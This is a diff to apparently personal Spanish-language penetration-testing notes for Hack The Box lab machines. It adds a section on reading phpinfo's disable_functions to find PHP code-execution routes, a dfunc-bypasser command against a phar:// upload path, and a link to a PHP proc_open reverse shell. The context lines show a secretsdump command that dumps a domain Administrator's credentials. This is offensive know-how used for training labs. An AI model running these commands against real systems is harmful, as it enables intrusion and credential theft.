@@ -5609,6 +5609,19 @@ klist
 secretsdump.py -k -no-pass -dc-ip 10.129.9.33 -just-dc-user Administrator g0.flight.htb
 ```
 
+## Disable_functions in the php.ini file
+
+Ya sabes que en el phpinfo vienen un campo que dice Disable_functions indica que funciones estan deshabilitadas esto es como una brujula que te dice como podrias ejeuctar codigo php.
+
+```
+
+python2 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/5e31601b65f0062e32966f2f8e94fbb0/info.0xdf/info
+```
+
+## PHP proc_open shell
+
+> https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7#file-reverse-shell-php-L62
+
 # Priv Escalation  ARENA
 
 ----------------------------------------------------------------------------
